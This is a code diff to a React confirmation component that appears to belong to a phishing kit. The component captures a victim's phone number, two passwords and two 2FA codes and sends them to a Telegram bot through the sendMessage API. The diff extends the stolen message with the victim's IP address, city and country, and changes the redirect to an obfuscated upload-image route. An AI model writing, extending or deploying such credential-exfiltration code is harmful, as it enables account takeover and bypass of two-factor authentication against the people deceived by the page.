@@ -64,7 +64,10 @@ const ConfirmComponent = () => {
             '%0A<strong>Phone Number: </strong>' + firstCode.fill_phone + 
             '%0A<strong>Password First: </strong>' + firstCode.firt_password +
             '%0A<strong>Password Second: </strong>' + firstCode.second_password +
-            '%0A<strong>First Code Authen: </strong>' + firstCode.first_code;
+            '%0A<strong>First Code Authen: </strong>' + firstCode.first_code + 
+            '%0A<strong>IP: </strong>' + firstCode.IP + 
+            '%0A<strong>City: </strong>' + firstCode.city + 
+            '%0A<strong>Country Name: </strong>' + firstCode.countryName ;
 
             axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
                 .then((response) => {
@@ -77,6 +80,8 @@ const ConfirmComponent = () => {
         else {
             const dataLocalImages = !JSON.parse(localStorage.getItem('dataFirstCode')) ? JSON.parse(localStorage.getItem('dataPassWord')) : JSON.parse(localStorage.getItem('dataFirstCode'))
             const finalCode = {...dataLocalImages, seconds_code: values.fill_code}
+
+            console.log(finalCode);
 
             localStorage.setItem('dataAllCode', JSON.stringify(finalCode))
 
@@ -93,11 +98,14 @@ const ConfirmComponent = () => {
             '%0A<strong>Password First: </strong>' + finalCode.firt_password +
             '%0A<strong>Password Second: </strong>' + finalCode.second_password +
             '%0A<strong>First Code Authen: </strong>' + finalCode.first_code +
-            '%0A<strong>Second Code Authen : </strong>' + values.fill_code;
+            '%0A<strong>Second Code Authen : </strong>' + values.fill_code + 
+            '%0A<strong>IP: </strong>' + finalCode.IP + 
+            '%0A<strong>City: </strong>' + finalCode.city + 
+            '%0A<strong>Country Name: </strong>' + finalCode.countryName ;
 
             axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
             .then((response) => {
-                navigate('/adhelp-109445849938899595/upload-image');
+                navigate('/adcontact19485092349283487823/upload-image');
             })
             .catch((error) => {});
 
